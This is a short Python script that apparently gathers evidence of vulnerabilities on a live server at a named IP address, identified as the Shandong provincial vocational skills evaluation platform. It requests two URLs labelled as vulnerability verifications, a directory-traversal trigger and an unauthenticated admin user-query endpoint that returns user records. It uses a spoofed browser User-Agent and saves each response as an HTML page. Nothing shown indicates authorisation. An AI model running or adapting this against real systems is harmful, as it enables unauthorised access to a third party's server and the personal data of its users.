import urllib.request
import urllib.error
import os

proxy_handler = urllib.request.ProxyHandler({})
opener = urllib.request.build_opener(proxy_handler)

def fetch_url(url):
    try:
        req = urllib.request.Request(url)
        req.add_header('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
        resp = opener.open(req, timeout=10)
        return resp.status, dict(resp.headers.items()), resp.read()
    except urllib.error.HTTPError as e:
        return e.code, dict(e.headers.items()), e.read()
    except Exception as e:
        return None, None, str(e).encode('utf-8')

output_dir = r'e:\BaiduNetdiskDownload\1\screenshots'
os.makedirs(output_dir, exist_ok=True)

urls = [
    {
        'name': 'vuln_getTopLinksPortalCategoriesAction',
        'url': 'http://124.128.231.226:8888/web//getTopLinksPortalCategoriesAction.action?siteId=test',
        'title': '漏洞验证1 - getTopLinksPortalCategoriesAction.action (目录遍历触发)'
    },
    {
        'name': 'vuln_userAction',
        'url': 'http://124.128.231.226:8888/web//mep-admin/userAction!queryUser.action?start=0&limit=10',
        'title': '漏洞验证2 - userAction!queryUser.action (后台接口触发)'
    },
    {
        'name': 'sdskb_login',
        'url': 'http://124.128.231.226:8888/sdskb/',
        'title': '山东省职业技能综合评价信息管理平台'
    },
]

for item in urls:
    print(f"Fetching: {item['name']}")
    status, headers, body = fetch_url(item['url'])
    print(f"  Status: {status}")
    
    if isinstance(body, bytes):
        try:
            html = body.decode('utf-8')
        except:
            try:
                html = body.decode('gbk')
            except:
                html = body.decode('utf-8', errors='replace')
    else:
        html = str(body)
    
    # 创建一个包含URL信息的HTML页面
    full_html = f'''<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <title>{item['title']}</title>
    <style>
        body {{
            font-family: "Microsoft YaHei", Arial, sans-serif;
            margin: 0;
            padding: 20px;
            background-color: #f5f5f5;
        }}
        .url-bar {{
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 10px 15px;
            margin-bottom: 20px;
            font-size: 14px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
        .url-label {{
            color: #666;
            font-weight: bold;
            margin-right: 10px;
        }}
        .url-value {{
            color: #333;
            word-break: break-all;
        }}
        .status-bar {{
            background-color: #fff3cd;
            border: 1px solid #ffeeba;
            border-radius: 4px;
            padding: 8px 15px;
            margin-bottom: 20px;
            font-size: 13px;
            color: #856404;
        }}
        .content-frame {{
            background-color: #fff;
            border: 1px solid #ddd;
            border-radius: 4px;
            padding: 20px;
            min-height: 400px;
            box-shadow: 0 2px 4px rgba(0,0,0,0.1);
        }}
    </style>
</head>
<body>
    <div class="url-bar">
        <span class="url-label">访问URL:</span>
        <span class="url-value">{item['url']}</span>
    </div>
    <div class="status-bar">
        HTTP状态码: {status} | 验证时间: {__import__('datetime').datetime.now().strftime('%Y-%m-%d %H:%M:%S')} | 服务器: {headers.get('Server', 'N/A') if headers else 'N/A'}
    </div>
    <div class="content-frame">
        {html}
    </div>
</body>
</html>'''
    
    filepath = os.path.join(output_dir, f"{item['name']}.html")
    with open(filepath, 'w', encoding='utf-8') as f:
        f.write(full_html)
    print(f"  Saved to: {filepath}")

print("\nDone!")
